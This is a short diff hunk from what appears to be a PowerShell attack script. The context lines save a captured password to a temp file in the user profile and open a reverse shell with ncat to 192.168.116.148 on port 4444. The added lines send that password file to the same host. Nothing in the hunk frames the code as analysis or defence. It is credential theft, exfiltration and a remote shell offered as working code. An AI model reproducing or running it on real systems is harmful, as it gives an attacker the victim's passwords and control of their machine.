@@ -9,3 +9,5 @@ $filePath = "$env:USERPROFILE\AppData\Local\Temp\80992024$.txt"
 Add-Content -Path $filePath -value $password
 ##Begin Reverse Shell Process##
 ncat -nv 192.168.116.148 4444 -e cmd.exe
+##Sends file path to the server machine##
+cmd.exe -c "ncat 192.168.116.148 4444 < $env:USERPROFILE\AppData\Local\Temp\80992024$.txt"
